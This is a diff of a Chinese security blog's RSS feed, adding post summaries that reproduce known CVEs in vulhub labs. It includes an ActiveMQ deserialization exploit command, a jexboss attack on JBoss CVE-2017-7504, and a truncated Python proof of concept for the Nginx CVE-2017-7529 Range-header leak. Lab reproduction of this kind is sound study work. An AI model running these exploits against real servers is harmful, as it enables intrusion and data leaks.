@@ -92,12 +92,12 @@ VirusTotal
     </item>
     
     <item>
-      <title>Web漏洞</title>
-      <link>https://oopsdc.tk/post/web%E6%BC%8F%E6%B4%9E/</link>
+      <title>Apache漏洞复现</title>
+      <link>https://oopsdc.tk/post/apache%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
       <pubDate>Thu, 17 Jun 2021 09:03:30 +0800</pubDate>
       
-      <guid>https://oopsdc.tk/post/web%E6%BC%8F%E6%B4%9E/</guid>
-      <description>Apache Airflow 存储型XSS 漏洞描述 Apache Airflow 1.10.2及之前版本中的airflow webserver服务存在跨站脚本漏洞，该漏洞源于WEB应用缺少对客户端数据的正确验证，使得攻击者可利用该漏洞执行客户端代码。
+      <guid>https://oopsdc.tk/post/apache%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
+      <description>Airflow 存储型XSS 漏洞描述 Apache Airflow 1.10.2及之前版本中的airflow webserver服务存在跨站脚本漏洞，该漏洞源于WEB应用缺少对客户端数据的正确验证，使得攻击者可利用该漏洞执行客户端代码。
 影响版本 Apache Airflow 1.10.3以下版本。
 复现思路 漏洞复现 访问/admin/dagrun/(默认不需要密码)
 创建一个项目，输入ID后点击保存，返回列表，点击running字样，发现能够输入HTML代码，例:
@@ -112,6 +112,37 @@ ActiveMQ 反序列化漏洞 CVE-2015-5254 漏洞描述 Apache ActiveMQ是Apache�
 jmet的原理是使用jar包内置ysoserial生成Payload并发送，我们需要在ysoserial的gadget选择一个可使用的，如ROME。
  给目标ActiveMQ添加一个名为event的队列，点击事件为生成/tmp/vuln文件:
 java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &amp;#34;touch /tmp/vuln&amp;#34; -Yp ROME &amp;lt;ip&amp;gt; 61616 # 命令执行成功后回显如下 INFO d.c.j.t.JMSTarget [main] Connected with ID: ID:&amp;lt;server-id&amp;gt; INFO d.c.j.t.JMSTarget [main] Sent gadget &amp;#34;ROME&amp;#34; with command: &amp;#34;touch /tmp/vuln&amp;#34; INFO d.</description>
+    </item>
+    
+    <item>
+      <title>JBoss漏洞复现</title>
+      <link>https://oopsdc.tk/post/jboss%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Thu, 17 Jun 2021 09:03:30 +0800</pubDate>
+      
+      <guid>https://oopsdc.tk/post/jboss%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
+      <description>JBoss 4.x JBossMQ JMS 反序列化漏洞 CVE-2017-7504 漏洞描述 Red Hat JBoss Application Server是一款基于JavaEE的开源应用服务器。JBoss AS 4.x及之前版本中，JBossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞，攻击者可借助特制的序列化数据利用该漏洞执行任意代码。
+影响版本 JBoss AS 4.x及之前。
+复现思路 漏洞复现 环境搭建:
+git clone https://github.com/vulhub/vulhub.git cd vulhub/jboss/CVE-2017-7504 docker-compose up -d Jexboss工具:joaomatosf/jexboss: JexBoss: Jboss (and Java Deserialization Vulnerabilities) verify and EXploitation Tool (github.com)
+git clone https://github.com/joaomatosf/jexboss.git python3 jexboss.py -host http://&amp;lt;ip&amp;gt;:8080 成功利用漏洞执行命令。
+ 本文链接:JBoss漏洞复现 | Atmet (oopsdc.tk)
+文章许可:本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。
+ </description>
+    </item>
+    
+    <item>
+      <title>Nginx漏洞复现</title>
+      <link>https://oopsdc.tk/post/nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Thu, 17 Jun 2021 09:03:30 +0800</pubDate>
+      
+      <guid>https://oopsdc.tk/post/nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
+      <description>Nginx 越界读取缓存漏洞 CVE-2017-7529 漏洞描述 Nginx在反向代理站点的时候，通常会缓存一些文件，特别是静态文件。缓存的部分存储在文件中，每个缓存文件包括文件头+HTTP返回包头+HTTP返回包体。如果二次请求命中该缓存文件，Nginx会直接将该文件中的HTTP返回包体返回给用户。
+如果我的请求中包含Range头，Nginx将会根据我指定的start和end位置，返回指定长度的内容。而如果我构造了两个负的位置，如(-600, -9223372036854774591)，将可能读取到负位置的数据。如果这次请求又命中了缓存文件，则可能读取到缓存文件中位于HTTP返回包体前的文件头、HTTP返回包头等内容。
+影响版本 Nginx 0.5.6 ~ 1.13.2
+复现思路 漏洞复现 环境搭建:
+git clone https://github.com/vulhub/vulhub.git cd vulhub/nginx/CVE-2017-7529 docker-compose up -d 访问:http://&amp;lt;ip&amp;gt;:8080正常即可。
+POC已经在当前目录中给出来，文件名poc.py:
+#!/usr/bin/env python import sys import requests if len(sys.argv) &amp;lt; 2: print(&amp;#34;%surl&amp;#34; % (sys.argv[0])) print(&amp;#34;eg: python %shttp://your-ip:8080/&amp;#34; % (sys.argv[0])) sys.exit() headers = { &amp;#39;User-Agent&amp;#39;: &amp;#34;Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240&amp;#34; } offset = 605 url = sys.argv[1] file_len = len(requests.get(url, headers=headers).content) n = file_len + offset headers[&amp;#39;Range&amp;#39;] = &amp;#34;bytes=-%d,-%d&amp;#34; % ( n, 0x8000000000000000 - n) r = requests.</description>
     </item>
     
     <item>
